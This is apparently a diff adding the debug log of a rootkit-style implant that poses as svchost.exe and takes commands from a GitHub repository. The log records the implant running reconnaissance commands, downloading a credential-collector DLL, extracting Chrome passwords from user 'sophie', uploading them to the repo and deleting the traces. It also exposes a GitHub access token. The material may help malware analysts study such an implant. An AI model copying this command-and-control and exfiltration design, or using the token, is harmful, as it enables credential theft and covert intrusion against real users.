@@ -1,0 +1,87 @@
+Fri Jul 30 17:14:07 2021. Initialisation of the log file.
+
+DEBUG: Fri Jul 30 17:14:07 2021: GithubLogin: hidemepls785
+DEBUG: Fri Jul 30 17:14:07 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Fri Jul 30 17:14:07 2021: GihubAccessToken: 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
+DEBUG: Fri Jul 30 17:14:07 2021: Rootkit Name: greta_preprod
+DEBUG: Fri Jul 30 17:14:07 2021: Rootkit Registry Key: Sensors
+DEBUG: Fri Jul 30 17:14:07 2021: Run Registry Key Name: test
+DEBUG: Fri Jul 30 17:14:07 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Fri Jul 30 17:14:08 2021: The folder list for random folder is not empty. Its size is: 3069
+DEBUG: Fri Jul 30 17:14:08 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694
+DEBUG: Fri Jul 30 17:14:08 2021: Start of a new loop to get commands and treat them.
+DEBUG: Fri Jul 30 17:14:08 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Fri Jul 30 17:14:09 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Fri Jul 30 17:14:09 2021: Success to check the commands with rootkit_path1
+DEBUG: Fri Jul 30 17:14:09 2021: Getting this command from the github repo: execute_cmd dir C:\Users
+DEBUG: Fri Jul 30 17:14:09 2021: Getting this command from the github repo: password
+DEBUG: Fri Jul 30 17:14:09 2021: Getting this command from the github repo: execute_cmd wmic product get name,version
+DEBUG: Fri Jul 30 17:14:09 2021: Start to treat the commands sent by the github repo.
+DEBUG: Fri Jul 30 17:14:09 2021: Command received: execute_cmd
+DEBUG: Fri Jul 30 17:14:09 2021: The following command will be executed by powershell: dir C:\Users > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\target_command.log
+DEBUG: Fri Jul 30 17:14:14 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Fri Jul 30 17:14:14 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Fri Jul 30 17:14:14 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\target_command.log
+DEBUG: Fri Jul 30 17:14:14 2021: The file will be read as binary file.
+DEBUG: Fri Jul 30 17:14:14 2021: The file that will be read weight: 1044
+DEBUG: Fri Jul 30 17:14:14 2021: Success to read the binary file. This number of bytes have been read: 1045
+DEBUG: Fri Jul 30 17:14:15 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\target_command.log has been uploaded successfully in the github repo
+DEBUG: Fri Jul 30 17:14:15 2021: Success to delete the file that contains the output of the command.
+DEBUG: Fri Jul 30 17:14:15 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Fri Jul 30 17:14:15 2021: #####################################################
+
+DEBUG: Fri Jul 30 17:14:15 2021: Command received: password
+DEBUG: Fri Jul 30 17:14:15 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Fri Jul 30 17:14:15 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Fri Jul 30 17:14:16 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Fri Jul 30 17:14:16 2021: The size of the content of the file is: 333824
+DEBUG: Fri Jul 30 17:14:16 2021: Start of the method writeFileWindowsApi.
+DEBUG: Fri Jul 30 17:14:16 2021: The content size that will be written: 333824
+DEBUG: Fri Jul 30 17:14:16 2021: Success to write the content(number of bytes : 333824) in the file : C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\CredentialsCollectorDll.dll
+DEBUG: Fri Jul 30 17:14:16 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\CredentialsCollectorDll.dll
+DEBUG: Fri Jul 30 17:14:16 2021: Success to have an handle to the credential dll.
+DEBUG: Fri Jul 30 17:14:16 2021: End of the execution of the password dll.
+DEBUG: Fri Jul 30 17:14:16 2021: The file that contains chrome passwords has been copied.
+DEBUG: Fri Jul 30 17:14:16 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Fri Jul 30 17:14:16 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\chromepassword
+DEBUG: Fri Jul 30 17:14:16 2021: The file will be read as binary file.
+DEBUG: Fri Jul 30 17:14:16 2021: The file that will be read weight: 40960
+DEBUG: Fri Jul 30 17:14:16 2021: Success to read the binary file. This number of bytes have been read: 40961
+DEBUG: Fri Jul 30 17:14:17 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\chromepassword has been uploaded successfully in the github repo
+DEBUG: Fri Jul 30 17:14:17 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\chromepassword has been uploaded successfully in the github repo
+DEBUG: Fri Jul 30 17:14:17 2021: The file that contains passwords has been created.
+DEBUG: Fri Jul 30 17:14:17 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Fri Jul 30 17:14:17 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\password_output.txt
+DEBUG: Fri Jul 30 17:14:17 2021: The file will be read as binary file.
+DEBUG: Fri Jul 30 17:14:17 2021: The file that will be read weight: 2161
+DEBUG: Fri Jul 30 17:14:17 2021: Success to read the binary file. This number of bytes have been read: 2162
+DEBUG: Fri Jul 30 17:14:17 2021: The files C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\password_output.txt has been uploaded successfully in the github repo
+DEBUG: Fri Jul 30 17:14:17 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Fri Jul 30 17:14:17 2021: The file truely exists in the random folder.
+DEBUG: Fri Jul 30 17:14:17 2021: Success to delete the file. End of the method
+DEBUG: Fri Jul 30 17:14:17 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Fri Jul 30 17:14:17 2021: The file truely exists in the random folder.
+DEBUG: Fri Jul 30 17:14:17 2021: Success to delete the file. End of the method
+DEBUG: Fri Jul 30 17:14:17 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Fri Jul 30 17:14:17 2021: The file truely exists in the random folder.
+ERROR: Fri Jul 30 17:14:17 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Fri Jul 30 17:14:17 2021: End of the method messageManagerPasswordModule.
+DEBUG: Fri Jul 30 17:14:17 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Fri Jul 30 17:14:17 2021: #####################################################
+
+DEBUG: Fri Jul 30 17:14:17 2021: Command received: execute_cmd
+DEBUG: Fri Jul 30 17:14:17 2021: The following command will be executed by powershell: wmic product get name,version > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\target_command.log
+DEBUG: Fri Jul 30 17:14:22 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Fri Jul 30 17:14:22 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Fri Jul 30 17:14:22 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694\target_command.log
+DEBUG: Fri Jul 30 17:14:22 2021: The file will be read as binary file.
+DEBUG: Fri Jul 30 17:14:22 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Fri Jul 30 17:14:22 2021: There is no content returning by readFileWindowsApi. Aborting..
+DEBUG: Fri Jul 30 17:14:22 2021: Unable to delete the file that contains the output of the command.
+DEBUG: Fri Jul 30 17:14:22 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Fri Jul 30 17:14:22 2021: #####################################################
+
+DEBUG: Fri Jul 30 17:14:22 2021: Start of GithubCommunication::sendResults
+DEBUG: Fri Jul 30 17:14:24 2021: The results was uploaded on the github repo
+DEBUG: Fri Jul 30 17:14:24 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Fri Jul 30 17:14:24 2021: Start of GithubCommunication::sendLogs
